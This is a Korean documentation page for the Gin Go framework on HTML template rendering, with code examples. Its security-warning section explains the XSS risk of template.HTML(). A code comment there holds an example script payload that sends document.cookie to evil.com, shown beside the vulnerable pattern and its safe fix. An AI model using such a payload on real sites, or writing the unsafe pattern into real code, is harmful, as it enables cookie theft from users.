---
title: "HTML 렌더링"
sidebar:
  order: 9
---

Gin은 HTML 렌더링을 위해 [html/template](https://pkg.go.dev/html/template) 패키지를 사용합니다.
사용 가능한 플레이스홀더를 포함한 사용 방법에 대한 자세한 정보는 [text/template](https://pkg.go.dev/text/template) 문서를 참조하세요.

HTML 파일을 로드하려면 LoadHTMLGlob() 또는 LoadHTMLFiles()를 사용합니다.

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

다른 디렉토리에서 같은 이름의 템플릿 사용하기

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**참고:** HTML 템플릿을 `{{define <template-path>}} {{end}}` 블록으로 감싸고 상대 경로 `<template-path>`로 템플릿 파일을 정의하세요. 그렇지 않으면 GIN이 템플릿 파일을 올바르게 파싱하지 못합니다.

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### http.FileSystem에서 템플릿 로드하기 (v1.11+)

템플릿이 임베드되어 있거나 `http.FileSystem`에서 제공되는 경우, `LoadHTMLFS`를 사용하세요:

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### 보안 경고: `template.HTML()`은 자동 이스케이프를 우회합니다

Go의 `html/template` 패키지는 크로스 사이트 스크립팅(XSS)을 방지하기 위해 템플릿에 삽입된 값을 자동으로 이스케이프합니다. 그러나 문자열을 `template.HTML()`로 캐스팅하면 이 보호를 명시적으로 우회합니다. 문자열에 사용자 제공 입력이 포함된 경우, 공격자가 임의의 JavaScript를 주입할 수 있습니다.

**안전하지 않음 -- 사용자 입력에 `template.HTML()`을 절대 사용하지 마세요:**

```go
// 위험: 공격자가 userInput을 제어하며, 다음과 같을 수 있습니다:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS 취약점!
})
```

**안전 -- 템플릿 엔진이 사용자 입력을 자동으로 이스케이프하도록 합니다:**

```go
// 안전: html/template가 userInput의 모든 HTML/JS를 이스케이프합니다
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // html/template에 의해 자동 이스케이프
})
```

자체 코드에 정의된 정적 HTML 스니펫과 같이 완전히 제어하는 콘텐츠에만 `template.HTML()`을 사용하세요. 사용자 입력, 사용자가 채운 데이터베이스 필드 또는 기타 신뢰할 수 없는 소스에서 온 값에는 절대 사용하지 마세요.

### 커스텀 템플릿 렌더러

자체 HTML 템플릿 렌더를 사용할 수도 있습니다.

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### 커스텀 구분자

커스텀 구분자를 사용할 수 있습니다.

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### 커스텀 템플릿 함수

자세한 [예제 코드](https://github.com/gin-gonic/examples/tree/master/template)를 참조하세요.

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

결과:

```sh
Date: 2017/07/01
```
